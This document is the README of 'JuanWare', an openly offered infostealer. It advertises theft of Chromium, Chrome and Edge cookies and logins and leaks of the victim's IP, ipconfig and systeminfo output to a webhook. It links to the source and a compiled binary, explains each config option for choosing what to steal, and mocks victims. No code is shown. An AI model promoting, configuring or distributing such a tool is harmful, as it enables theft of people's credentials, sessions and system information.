# JuanWare®
A Program which once started, will rob your system of any valuables depending on how you have configured it.

> DISCLAIMER: it is 100% your fault if you run it on accident and get your credentials stolen / deleted

Features:
- Chromium cookie grabber
- Chromium login stealer
- IP leaker
- Integration support for other applications.
+ More!

build yourself a [Juan](https://github.com/CIA-Nano-Technologies/JuanWare)

or

download an already compiled [binary](https://github.com/CIA-Nano-Technologies/JuanWare/releases/latest)

if you dont know how to build Juan, follow this [guide](https://love2d.org/wiki/Game_Distribution)

Config:

This config file acts kinda like Juans instructions on what to steal, heres a short explanation on all of em:

`Webhook`

Sends https requests to dump all of the info it can find

`Stealer.Enabled`

Tells Juan to steal valuables or not

`Stealer.Cookies`

Tells Juan to steal cookies or not

`Stealer.Browsers`

Up to 3 options:

`Chromium` `Chrome` `Edge`

(On edge it will not steal login information, because its on the cloud, and Juan isnt a negamind)

`Leaker.Enabled`

Tells Juan to leak shit about the targets pc

`Leaker.IP`

Tells Juan to leak the IP

`Leaker.IPConfig`

Tells Juan to leak all of the shit visible when u type `ipconfig` in cmd

`Leaker.systeminfoCMD`

Tells Juan to leak all of the shit u see when u type `systeminfo` in cmd

(this may be seperated into several messages due to it easily hitting the 2000 character cap)

`Extras.StartMSG`

Tells Juan what to say when someone starts the payload

`Extras.EndMSG`

Tells Juan what to say when he has successfully robbed a dumbfuck

`Extras.MOTD.Enabled`

Tells Juan to say a random message at the end

`%s=USERNAME`

`Extras.MOTD.Messages`

A list of random messages he can say
